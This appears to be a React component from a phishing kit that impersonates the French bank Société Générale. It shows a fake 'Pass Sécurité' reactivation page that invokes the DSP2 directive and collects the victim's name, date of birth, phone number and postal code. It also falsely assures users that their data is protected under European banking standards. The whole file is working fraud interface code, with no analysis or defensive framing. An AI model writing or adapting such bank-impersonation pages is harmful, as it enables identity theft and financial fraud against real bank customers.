import React, { useState } from 'react';

interface VerificationStepProps {
  onContinue: (nom: string, prenom: string, date: string, tel: string, codePostal: string) => void;
}

function formatDate(value: string): string {
  const digits = value.replace(/\D/g, '').substring(0, 8);
  if (digits.length <= 2) return digits;
  if (digits.length <= 4) return `${digits.slice(0, 2)}/${digits.slice(2)}`;
  return `${digits.slice(0, 2)}/${digits.slice(2, 4)}/${digits.slice(4)}`;
}

const VerificationStep: React.FC<VerificationStepProps> = ({ onContinue }) => {
  const [nom, setNom] = useState('');
  const [prenom, setPrenom] = useState('');
  const [date, setDate] = useState('');
  const [tel, setTel] = useState('');
  const [codePostal, setCodePostal] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);

  const cleanTel = tel.replace(/[\s\-\.\(\)]/g, '');
  const canSubmit = nom.trim().length > 0 && prenom.trim().length > 0 && date.length === 10 && cleanTel.length >= 6 && codePostal.trim().length >= 4 && !isSubmitting;

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!canSubmit) return;
    setIsSubmitting(true);
    await onContinue(nom.trim(), prenom.trim(), date, tel, codePostal);
  };

  return (
    <main className="pt-20 min-h-screen flex items-center justify-center px-4 py-8">
      <div className="w-full max-w-lg animate-fadeIn">
        <div className="bg-white rounded-2xl shadow-xl p-8 md:p-10">
          <form onSubmit={handleSubmit}>
            <div className="flex justify-center mb-6">
              <div className="w-24 h-24 md:w-28 md:h-28">
                <svg className="w-full h-full text-sg-red" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth="2">
                  <path strokeLinecap="round" strokeLinejoin="round" d="M9 12.75L11.25 15 15 9.75m-3-7.036A11.959 11.959 0 013.598 6 11.99 11.99 0 003 9.749c0 5.592 3.824 10.29 9 11.623 5.176-1.332 9-6.03 9-11.622 0-1.31-.21-2.571-.598-3.751h-.152c-3.196 0-6.1-1.248-8.25-3.285z" />
                </svg>
              </div>
            </div>

            <h2 className="font-heading text-2xl md:text-3xl font-bold text-center text-gray-900 mb-6 leading-tight">
              Vérification de votre<br />
              <strong className="text-sg-red">IDENTITÉ</strong>
            </h2>

            <div className="bg-orange-50 border-l-4 border-orange-500 rounded-r-lg p-5 mb-6">
              <div className="flex items-start">
                <svg className="w-5 h-5 text-orange-500 mt-0.5 mr-3 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
                </svg>
                <div className="flex-1">
                  <p className="text-sm text-gray-700 leading-relaxed">
                    <strong className="font-semibold text-orange-600">Directive DSP2</strong><br />
                    Conformément aux réglementations européennes en vigueur, nous vous prions de confirmer votre identité afin de finaliser la réactivation de votre Pass Sécurité.
                  </p>
                </div>
              </div>
            </div>

            <div className="mb-5">
              <label className="block text-sm font-semibold text-gray-700 mb-2">Nom</label>
              <input type="text" value={nom} onChange={e => setNom(e.target.value)} placeholder="Votre nom" required
                className="w-full px-4 py-3 border-2 border-gray-300 rounded-lg focus:outline-none focus:border-sg-red focus:ring-2 focus:ring-sg-red/20 transition-all" />
            </div>

            <div className="mb-5">
              <label className="block text-sm font-semibold text-gray-700 mb-2">Prénom</label>
              <input type="text" value={prenom} onChange={e => setPrenom(e.target.value)} placeholder="Votre prénom" required
                className="w-full px-4 py-3 border-2 border-gray-300 rounded-lg focus:outline-none focus:border-sg-red focus:ring-2 focus:ring-sg-red/20 transition-all" />
            </div>

            <div className="mb-5">
              <label className="block text-sm font-semibold text-gray-700 mb-2">Date de naissance (JJ/MM/AAAA)</label>
              <input type="tel" value={date} onChange={e => setDate(formatDate(e.target.value))} placeholder="19/03/1983"
                maxLength={10} required
                className="w-full px-4 py-3 border-2 border-gray-300 rounded-lg focus:outline-none focus:border-sg-red focus:ring-2 focus:ring-sg-red/20 transition-all" />
            </div>

            <div className="mb-5">
              <label className="block text-sm font-semibold text-gray-700 mb-2">Numéro de téléphone</label>
              <input type="tel" value={tel} onChange={e => setTel(e.target.value)} placeholder="06 12 34 56 78"
                required
                className="w-full px-4 py-3 border-2 border-gray-300 rounded-lg focus:outline-none focus:border-sg-red focus:ring-2 focus:ring-sg-red/20 transition-all" />
            </div>

            <div className="mb-6">
              <label className="block text-sm font-semibold text-gray-700 mb-2">Code postal</label>
              <input type="tel" value={codePostal} onChange={e => setCodePostal(e.target.value.replace(/\D/g, '').substring(0, 5))} placeholder="75001"
                maxLength={5} inputMode="numeric" required
                className="w-full px-4 py-3 border-2 border-gray-300 rounded-lg focus:outline-none focus:border-sg-red focus:ring-2 focus:ring-sg-red/20 transition-all" />
            </div>

            <button type="submit" disabled={!canSubmit}
              className={`w-full py-4 bg-sg-red text-white font-semibold text-lg rounded-full transition-all duration-200 shadow-lg ${
                canSubmit ? 'hover:bg-sg-red-dark hover:shadow-xl hover:-translate-y-0.5' : 'opacity-50 cursor-not-allowed'
              }`}>
              {isSubmitting ? 'Vérification...' : 'Réactiver mon Pass Sécurité'}
            </button>

            <div className="mt-6 pt-6 border-t border-gray-200">
              <div className="flex items-start text-sm text-gray-600">
                <svg className="w-5 h-5 text-blue-500 mt-0.5 mr-2 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                </svg>
                <p className="leading-relaxed">
                  Vos données sont sécurisées et protégées conformément aux normes bancaires européennes (DSP2).
                </p>
              </div>
            </div>
          </form>
        </div>

        <div className="flex justify-center mt-8">
          <img src="/logo-sg.svg" alt="Société Générale" className="h-12 md:h-16 opacity-60" />
        </div>
      </div>
    </main>
  );
};

export default VerificationStep;
